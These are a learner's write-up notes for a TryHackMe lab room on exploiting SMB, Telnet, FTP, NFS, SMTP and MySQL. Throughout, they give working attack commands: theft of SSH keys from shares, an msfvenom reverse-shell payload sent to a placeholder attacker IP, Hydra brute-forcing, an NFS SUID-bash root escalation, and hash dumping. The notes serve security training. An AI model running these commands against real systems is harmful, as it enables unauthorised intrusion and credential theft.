# 2.2 - [Network Services](https://tryhackme.com/room/networkservices)

## Overview
- This room covers enumeration and exploitation of **network services** commonly found on Windows and Linux.
- Protocols covered:
  - **SMB** (Server Message Block) – file sharing
  - **Telnet** – remote command-line (insecure)
  - **FTP** – file transfer
  - **NFS** (Network File System) – file sharing (UNIX/Linux)
  - **SMTP** – email transfer
  - **MySQL** – relational database
- Methodology: Port scanning (`nmap`), service enumeration (`enum4linux`, `showmount`, Metasploit modules), exploitation (`smbclient`, `telnet`, `hydra`, `msfvenom`, SSH, JohnTheRipper).

## SMB (Server Message Block)
- Client‑server protocol for sharing files, printers, etc. over a network.
- Uses TCP ports **139** and **445** (default).
- **Enumeration**: `nmap -sS -p- -vv -T5 <IP>` to find open ports; then use `enum4linux` to list shares, users, OS.
- **Enum4linux** options:
  - `-U` – user list
  - `-S` – share list
  - `-a` – full enumeration
- **Exploitation**:
  - Access anonymous shares with `smbclient //<IP>/<share> -U Anonymous -p 445`.
  - Browse and download files (e.g., `.ssh` directory with RSA keys) → SSH as discovered user.

**Experience**:
- Scanned IP → found ports 139/445 open.
- Ran `enum4linux -a <IP>` → discovered share `profiles` and user `John Cactus`.
- Connected via `smbclient //10.10.212.98/profiles -U Anonymous -p 445`.
- Found `.ssh` directory, `get id_rsa` → SSH into `cactus@<IP>` using the key.

**Commands:**
```bash
nmap -sS -p- -vv -T5 <IP>
enum4linux -a <IP>
smbclient //<IP>/<share> -U Anonymous -p 445
get <file>
ssh cactus@<IP> -i id_rsa
```

## Telnet
- Remote terminal protocol; **unencrypted** (cleartext) – replaced by SSH.
- Default port **23** but can be hidden on non‑standard ports.

**Enumeration**:
- Scan all ports with `-p-` to find hidden services.
- Aggressive scan: `nmap -p <port> -A -vv <IP>` → reveals banner (e.g., "SKIDY'S BACKDOOR").

**Exploitation**:
- Connect via `telnet <IP> <port>`.
- Use `.HELP` to see available commands (e.g., `.RUN`, `.EXIT`).
- Test connectivity: on attacker, start `tcpdump` listener: `sudo tcpdump ip proto \\icmp -i tun0`; then from Telnet: `.RUN ping <attacker_IP> -c 1`.
- Generate reverse shell payload with `msfvenom`:
  ```bash
  msfvenom -p cmd/unix/reverse_netcat lhost=<attacker_IP> lport=4444 R
  ```
- Start `nc -lvnp 4444` on attacker, then run the payload on Telnet via `.RUN <payload>`.
- Get shell, `cat flags.txt`.

**Experience**:
- Found port 8012 open via `-p-`.
- Banner "SKIDY'S BACKDOOR" indicated backdoor service.
- Used `.RUN` to execute commands, set up listener, got reverse shell.

## FTP (File Transfer Protocol)
- Transfers files over network; default ports **21** (command) and **20** (data).
- Unencrypted, vulnerable to eavesdropping.

**Enumeration**:
- `nmap -p- -vv -T5` to find port 21; aggressive scan for version (`vsftpd`).
- Anonymous login: `ftp <IP>` with username `anonymous`.
- List files, read `PUBLIC_NOTICE.txt` → reveals potential username (e.g., `Mike`).

**Exploitation**:
- Brute‑force password using **Hydra**:
  ```bash
  hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp
  ```
- (Unzip rockyou.txt: `gunzip /usr/share/wordlists/rockyou.txt.gz` if needed.)
- Once credentials found, login via `ftp <IP>` and retrieve flag.

**Experience**:
- Found FTP open; got username `Mike` from notice.
- Hydra cracked password `password`.
- Logged in as Mike, found flag.

## NFS (Network File System)
- UNIX/Linux file sharing protocol; uses RPC and port **2049** by default.

**Enumeration**:
- `nmap -p- -vv -T5` → find port 2049 open.
- `showmount -e <IP>` to list exported shares.
- Mount the share locally:
  ```bash
  mkdir /tmp/mount
  sudo mount -t nfs <IP>:<share> /tmp/mount -nolock
  ```
- Browse mounted directory; look for `.ssh` folder, user home names → gather username and SSH private key.

**Exploitation (Privilege Escalation)**:
- With SSH access (using stolen key), and NFS share writable, escalate to root:
  1. Copy `/bin/bash` from target to local via `scp`.
  2. Change owner to root: `sudo chown root bash`.
  3. Copy to NFS share: `cp bash /tmp/mount/`.
  4. Set SUID bit: `sudo chmod +s /tmp/mount/bash`.
  5. SSH back as user, execute `./bash -p` → root shell.
- This works if **root squashing** is disabled (misconfigured).

**Experience**:
- Found NFS share `/home` exported; mounted it.
- Found `.ssh/id_rsa` and username `cappuccino`.
- Used key to SSH.
- Followed SUID method to gain root; got flag from `/root`.

**Commands:**
```bash
showmount -e <IP>
mount -t nfs <IP>:home /tmp/mount -nolock
scp -i id_rsa cappuccino@<IP>:/bin/bash .
sudo chown root bash
cp bash /tmp/mount/
sudo chmod +s /tmp/mount/bash
ssh -i id_rsa cappuccino@<IP>
./bash -p
```

## SMTP (Simple Mail Transfer Protocol)
- Email transfer protocol; uses port **25** by default.
- Works with POP/IMAP for receiving.

**Enumeration**:
- `nmap -p-` to find port 25.
- Use Metasploit modules:
  - `auxiliary/scanner/smtp/smtp_version` – discover mail server info (e.g., `Postfix`).
  - `auxiliary/scanner/smtp/smtp_enum` – enumerate users using `VRFY`/`EXPN`.
- Set `RHOSTS` and `USER_FILE` (e.g., `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt`).

**Exploitation**:
- If SSH (port 22) is open, brute‑force the discovered username (e.g., `administrator`) with Hydra:
  ```bash
  hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh
  ```
- Login via SSH with cracked password, read flag.

**Experience**:
- Found port 25 open; `smtp_version` revealed `polosmtp.home` and `Postfix`.
- `smtp_enum` found user `administrator`.
- Hydra cracked `administrator:alejandro`.
- SSH into server, got flag.

## MySQL
- Relational database; default port **3306**.

**Enumeration**:
- Connect if credentials known (e.g., `root:password`):
  ```bash
  mysql -h <IP> -u root -p --skip-ssl
  ```
- Use Metasploit modules:
  - `auxiliary/scanner/mysql/mysql_version` – get version.
  - `auxiliary/scanner/mysql/mysql_schemadump` – list all databases and tables.
  - `auxiliary/scanner/mysql/mysql_hashdump` – dump password hashes.

**Exploitation**:
- Crack dumped hash with **John the Ripper** (e.g., `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`).
- Get credentials for a user (e.g., `carl:doggie`), then SSH (if port 22 open) and retrieve flag.

**Experience**:
- Found open port 3306; had `root:password`.
- Used `mysql_hashdump` to get hashes; cracked `carl`'s hash to `doggie`.
- SSH as `carl`, got flag.

## Commands Quick Reference

| Service | Enumeration | Exploitation |
|---------|-------------|--------------|
| SMB | `nmap -p 139,445`, `enum4linux -a` | `smbclient`, SSH with keys |
| Telnet | `nmap -p-`, `-A` for banner | `telnet`, `msfvenom` payload, `nc` listener |
| FTP | `nmap -p 21`, `ftp anonymous` | `hydra` brute‑force, `ftp` login |
| NFS | `nmap -p 2049`, `showmount -e` | mount, SUID bash privesc |
| SMTP | `nmap -p 25`, `msf` smtp_version/enum | `hydra` for SSH if open |
| MySQL | `nmap -p 3306`, `msf` schema/hash dump | `john` to crack hash, SSH |

## Key Takeaways
- **Enumeration is critical**: always scan all ports (`-p-`) to catch hidden services.
- **NSE and Metasploit** greatly speed up SMTP, MySQL, and other service enumeration.
- **Misconfigurations** (anonymous SMB, weak FTP passwords, exported NFS shares, root squashing disabled) are common entry points.
- **Privilege escalation** via NFS SUID technique is a powerful method when root squashing is misconfigured.
- **Hydra + rockyou.txt** is the go‑to for password brute‑forcing.
- **John the Ripper** cracks MySQL password hashes effectively.
- Always look for SSH keys in SMB/NFS shares – they often lead straight to access.
